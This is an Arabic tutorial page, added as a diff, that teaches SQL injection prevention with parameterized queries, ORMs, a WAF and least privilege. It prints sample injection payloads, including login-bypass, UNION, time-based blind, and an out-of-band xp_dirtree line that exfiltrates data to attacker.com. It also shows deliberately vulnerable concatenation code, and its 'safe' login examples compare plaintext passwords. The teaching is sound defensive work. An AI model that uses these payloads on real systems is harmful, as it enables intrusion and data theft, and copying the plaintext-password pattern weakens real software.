@@ -1,0 +1,173 @@
+---
+title: "الحماية من SQL Injection"
+description: "SQL Injection بالعربي: كيف تعمل، أنواعها، الوقاية بـ parameterized queries والـ ORM."
+order: 4
+keywords: ["sql injection prevention", "parameterized queries", "حقن sql", "orm security"]
+---
+
+## ما هي SQL Injection؟
+
+SQL Injection (حقن SQL) هي ثغرة تسمح للمهاجم بإدخال استعلامات SQL ضارة عبر مدخلات التطبيق، مما قد يؤدي إلى تسرب البيانات أو حذفها أو تعديلها.
+
+## كيف تعمل؟
+
+```sql
+-- استعلام أصلي
+SELECT * FROM users WHERE email = 'user@example.com' AND password = 'mypassword';
+
+-- إدخال خبيث: email = ' OR 1=1 -- 
+SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = 'anything';
+
+-- النتيجة: 1=1 دائما true → يعيد كل المستخدمين!
+```
+
+```javascript
+// كود JavaScript ضعيف
+const query = `SELECT * FROM users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`;
+db.query(query, (err, results) => {
+  if (results.length > 0) {
+    // تسجيل دخول ناجح بدون كلمة مرور صحيحة!
+  }
+});
+```
+
+## أنواع SQL Injection
+
+### 1. In-Band SQLi (الأكثر شيوعا)
+
+المهاجم يستخدم نفس قناة الاتصال لشن الهجوم وجمع النتائج.
+
+```sql
+-- Error-based: استخراج بيانات عبر رسائل الخطأ
+' AND 1=CONVERT(int, (SELECT @@version)) --
+
+-- Union-based: دمج استعلام مع استعلام آخر
+' UNION SELECT username, password FROM users --
+```
+
+### 2. Blind SQLi (أعمى)
+
+المهاجم لا يرى النتائج مباشرة، لكنه يستنتج المعلومات من استجابات التطبيق.
+
+```sql
+-- Boolean-based: أسئلة بنعم/لا
+' AND (SELECT COUNT(*) FROM users) > 0 -- → يعيد نتائج (نعم)
+' AND (SELECT COUNT(*) FROM users) > 100 -- → لا يعيد نتائج (لا)
+
+-- Time-based: استخدام التأخير الزمني
+' AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(5), 0) --
+```
+
+### 3. Out-of-Band SQLi
+
+المهاجم يستخدم قناة مختلفة (مثل DNS أو HTTP) لاستخراج البيانات.
+
+```sql
+-- إرسال البيانات إلى خادم المهاجم عبر DNS
+' EXEC master..xp_dirtree '\\attacker.com\data' --
+```
+
+## الوقاية بـ Parameterized Queries
+
+### Node.js مع pg (PostgreSQL)
+
+```javascript
+const { Pool } = require('pg');
+const pool = new Pool();
+
+// ✅ آمن - parameterized query
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+
+  const result = await pool.query(
+    'SELECT * FROM users WHERE email = $1 AND password = $2',
+    [email, password] // المعاملات منفصلة عن الاستعلام
+  );
+
+  if (result.rows.length > 0) {
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ error: 'بيانات غير صحيحة' });
+  }
+});
+```
+
+### MySQL مع mysql2
+
+```javascript
+const mysql = require('mysql2/promise');
+
+// ✅ آمن - placeholders
+const [rows] = await connection.execute(
+  'SELECT * FROM products WHERE category = ? AND price < ?',
+  [req.query.category, req.query.maxPrice]
+);
+```
+
+### SQLite
+
+```javascript
+const db = require('better-sqlite3')('app.db');
+
+// ✅ آمن
+const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
+```
+
+## الحماية باستخدام ORM
+
+ORM (مثل Prisma أو Sequelize أو TypeORM) يوفر حماية مدمجة إذا استخدم بشكل صحيح.
+
+```javascript
+// Prisma - آمن تلقائيا
+const user = await prisma.user.findUnique({
+  where: { email: req.body.email }
+});
+
+// لكن احذر من raw queries
+const users = await prisma.$queryRawUnsafe(
+  `SELECT * FROM users WHERE email = '${req.body.email}'` // ثغرة!
+);
+
+// استخدم tagged templates بدلا من ذلك
+const users = await prisma.$queryRaw`
+  SELECT * FROM users WHERE email = ${req.body.email}
+`;
+```
+
+## طبقات حماية إضافية
+
+```text
+Web Application Firewall (WAF):
+  يمنع أنماط الهجوم المعروفة قبل وصولها للتطبيق.
+
+مثال مع Cloudflare WAF:
+  - قواعد مدمجة لمنع SQL Injection
+  - تحليل سلوكي للطلبات
+  - تحديثات تلقائية لأنماط الهجوم الجديدة
+
+Least Privilege لقاعدة البيانات:
+  - مستخدم التطبيق: صلاحيات SELECT/INSERT/UPDATE فقط
+  - لا تستخدم root أو admin
+  - افصل بين قواعد البيانات إن أمكن
+```
+
+```javascript
+// إعداد صلاحيات قاعدة البيانات
+-- إنشاء مستخدم بصلاحيات محدودة
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';
+-- لا تعطه DELETE أو DROP أو CREATE
+```
+
+## قائمة تفقدية
+
+- [ ] استخدم parameterized queries أو prepared statements دائما
+- [ ] لا تستخدم concatenation لبناء الاستعلامات
+- [ ] استخدم ORM مع تجنب raw queries
+- [ ] طبق Least Privilege على مستخدم قاعدة البيانات
+- [ ] شغل WAF أمام التطبيق
+- [ ] اختبر التطبيق بانتظام باستخدام أدوات فحص SQLi
+
+> ⚠️ SQL Injection من أخطر الثغرات وأكثرها تأثيرا. ملايين السجلات تسربت بسبب عدم استخدام parameterized queries.
+
+> 🎯 التالي: [الحماية من XSS و CSRF](/tracks/api-security/05-xss-csrf)
